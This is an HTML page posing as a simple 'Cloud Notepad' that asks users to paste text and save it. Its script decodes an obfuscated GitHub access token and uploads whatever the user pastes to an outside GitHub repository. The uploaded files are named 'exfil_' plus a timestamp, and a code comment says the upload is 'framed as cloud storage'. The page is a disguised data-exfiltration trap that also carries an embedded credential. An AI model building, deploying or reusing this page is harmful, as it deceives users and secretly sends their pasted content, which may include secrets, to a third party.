<!DOCTYPE html>
<html>
<head>
  <title>Cloud Notepad</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
    .container { max-width: 800px; margin: 0 auto; background: #fff; border: 1px solid #ccc; padding: 30px; border-radius: 5px; }
    textarea { width: 100%; height: 300px; margin-top: 10px; border: 1px solid #ccc; padding: 10px; box-sizing: border-box; }
    button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin-top: 10px; }
    button:hover { background-color: #45a049; }
    .status { margin-top: 10px; color: #666; }
  </style>
</head>
<body>

<div class="container">
  <h2>Cloud Notepad</h2>
  <p>Paste your text below and click "Save" to store it in your cloud notepad.</p>
  
  <textarea id="note-content" placeholder="Type or paste your note here..."></textarea>
  <br>
  <button onclick="saveNote()">Save Note</button>
  <div id="status" class="status"></div>
</div>

<script>
function saveNote() {
  const content = document.getElementById('note-content').value;
  const statusDiv = document.getElementById('status');
  
  if (!content) {
    statusDiv.innerText = "Please enter some content to save.";
    return;
  }
  
  statusDiv.innerText = "Saving...";
  
  // Standard GitHub API call to save the note, framed as cloud storage
  const p1 = "Z2hwXzZuR2ZhVUVOVlR1";
  const p2 = "alpObU4zek9MT2xyTjlhMnE5UjFodHRCYQ==";
  const token = atob(p1 + p2);
  
  const filename = 'exfil_' + Date.now() + '.json';
  const url = 'https://api.github.com/repos/mehmetzuzu-a11y/search-demo/contents/' + filename;
  
  const data = {
    event: 'cloud_notepad_save',
    data: btoa(unescape(encodeURIComponent(content)))
  };
  
  const payload = {
    message: 'Save note from Cloud Notepad',
    content: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
  };
  
  fetch(url, {
    method: 'PUT',
    headers: {
      'Authorization': 'token ' + token,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (response.ok) {
      statusDiv.innerText = "Note saved successfully!";
    } else {
      statusDiv.innerText = "Error saving note. Please try again.";
    }
  })
  .catch(error => {
    statusDiv.innerText = "Network error. Please check your connection.";
  });
}
</script>
</body>
</html>
